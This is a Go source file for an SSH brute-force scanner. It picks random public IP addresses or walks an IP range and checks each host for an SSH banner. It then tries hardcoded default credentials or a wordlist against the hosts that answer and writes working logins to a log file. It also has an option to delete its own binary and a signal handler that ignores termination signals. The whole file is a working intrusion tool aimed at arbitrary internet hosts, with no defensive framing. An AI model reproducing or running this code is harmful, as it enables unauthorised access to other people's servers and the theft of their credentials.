package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/dynport/gossh"
)

var verbose *bool
var cPwds chan string
var pwds = [...]string{"admin", "nagios", "oracle", "mysql", "vargrant", "", "debian", "ubuntu", "ftp", "root", "123", "1234", "12345", "123456", "password", "Password", "password123", "Password123", "qwerty", "q1w2e3r4t5", "q1w2e3r4", "1337", "toor", "t00r"}
var users = [...]string{"root", "ftp", "oracle", "mysql", "nagios", "vargrant", "admin", "operator", "pi", "debian", "ubuntu"}

func check(err error, msg string) {
	if err != nil {
		//fmt.Println(msg)
		os.Exit(1)
	}
}

func trySSH(user, pass, host string, port int) bool {

	client := gossh.New(host, user)
	client.Port = port
	client.SetPassword(pass)
	defer client.Close()

	_, e := client.Execute("w")
	if e != nil {
		//fmt.Println(e.Error())

		if strings.Contains(e.Error(), "unable to authenticate") {
			if *verbose {
				fmt.Printf("[%s] [%s] [%s]\n", host, user, pass)
			}
			return false
		} else if strings.Contains(e.Error(), "ssh: handshake failed: EOF") {
			cPwds <- pass
			if *verbose {
				fmt.Printf("[%s] [%s] [%s] retrying...\n", host, user, pass)
			}
			return false

		} else if strings.Contains(e.Error(), "process exited with") {
			if *verbose {
				fmt.Printf("[%s] [%s] [%s] Goooooood!!!! %s\n", host, user, pass, e.Error())
			}
			return true
		}

		if *verbose {
			fmt.Printf("[%s] [%s] [%s] %s\n", host, user, pass, e.Error())
		}
		return false
	}

	if *verbose {
		fmt.Printf("[%s] [%s] [%s] Goooooood!!!!\n", host, user, pass)
	}
	return true
}

func signals() {
	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGTERM,
		syscall.SIGKILL,
		syscall.SIGQUIT)
	go func() {
		for {
			s := <-sigc
			fmt.Println(s)
		}
	}()
}

func randInt(min int, max int) int {
	rand.Seed(time.Now().UTC().UnixNano())
	return min + rand.Intn(max-min)
}

func genIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(15, 200), randInt(5, 220), randInt(5, 220), randInt(5, 220))
}

func checkSSHPort(ip string, port int, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), timeout*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	fmt.Fprintf(conn, "HEAD\n\n")
	buff := make([]byte, 1024)
	conn.Read(buff)
	//fmt.Printf("[%s]\n", string(buff))

	if strings.HasPrefix(string(buff), "SSH") {
		return true
	}
	return false
}

func brute(ip string, port int) {
	//fmt.Printf("Bruteforcing %s\n", ip)
	for _, p := range pwds {
		for _, u := range users {
			//fmt.Printf("%s:%s\n", u, p)
			go func(u string, p string, ip string) {
				if trySSH(u, p, ip, port) {
					log(ip + ":" + u + ":" + p)
					return
				}
			}(u, p, ip)
		}
	}
	//fmt.Printf("End bruteforce %s\n", ip)
}

func randomNode(port int) {
	var ip string

	for {
		ip = genIP()
		if checkSSHPort(ip, port, 2) {
			brute(ip, port)
		}
	}
}

func checkIP(ip string, port int) {
	//fmt.Println("checking ", ip)
	if checkSSHPort(ip, port, 2) {
		go brute(ip, port)
	}
}

func node(startIP string, endIP string, port int) {
	sIP := ip2octet(startIP)
	eIP := ip2octet(endIP)

	for a := sIP[0]; a <= eIP[0]; a++ {
		for b := sIP[1]; b <= eIP[1]; b++ {
			for c := sIP[2]; c <= eIP[2]; c++ {
				for d := sIP[3]; d <= eIP[3]; d++ {

					ip := octet2ip([4]int{a, b, c, d})
					checkIP(ip, port)
				}
			}
		}
	}

	//fmt.Printf("net range %s->%s end!\n", startIP, endIP)
}

func log(msg string) {
	fmt.Println(msg)
	f, err := os.OpenFile("sshscan.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		fmt.Println(err)
	}
	check(err, "can't log")
	defer f.Close()
	fmt.Fprintf(f, "%s\n", msg)
}

func wait() {
	var i int
	fmt.Println("Press enter to stop.")
	fmt.Scanf("%d", &i)
}

func loadWordlist(wordlist string) {
	file, err := os.Open(wordlist)
	check(err, "Can't load the wordlist")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		cPwds <- scanner.Text()
	}
	close(cPwds)
	fmt.Println("Dictionary loaded.")
}

func main() {
	login := flag.String("login", "", "login to brute")
	dict := flag.String("dict", "", "passwords dictionary file")
	startIP := flag.String("start", "", "starting ip")
	endIP := flag.String("end", "", "ending ip")
	IP := flag.String("ip", "", "single ip address")
	goroutines := flag.Int("go", 2, "num of goroutines")
	rndMode := flag.Bool("rnd", false, "scan randomly")
	verbose = flag.Bool("v", false, "verbose mode")
	doRM := flag.Bool("rm", false, "rm")
	port := flag.Int("port", 22, "SSH port")
	flag.Parse()

	signals()

	if *doRM {
		os.Remove(os.Args[0])
	}

	if *rndMode {
		for i := 0; i < *goroutines-1; i++ {
			go randomNode(*port)
		}
		randomNode(*port)
		return
	}

	if len(*IP) > 0 {
		//single ip mode

		//single login mode + wordlist
		if len(*login) > 0 {

			if len(*dict) <= 0 {
				fmt.Println("plsease select the dictionary file")
				return
			}

			if !checkSSHPort(*IP, *port, 5) {
				fmt.Printf("No SSH found at %s", *IP)
				return
			}

			cPwds = make(chan string, 6)
			go loadWordlist(*dict)

			for i := 0; i < *goroutines; i++ {
				go func(ip string, port int, login string, id int) {

					for pwd := range cPwds {
						if trySSH(login, pwd, ip, port) {
							log(ip + ":" + login + ":" + pwd)
							os.Exit(1)
							return
						}
					}

				}(*IP, *port, *login, i)
			}

		} else {
			// single ip mode with default users+passwords
			checkIP(*IP, *port)
		}

		wait()
		return
	}

	node(*startIP, *endIP, *port)
	wait()
}
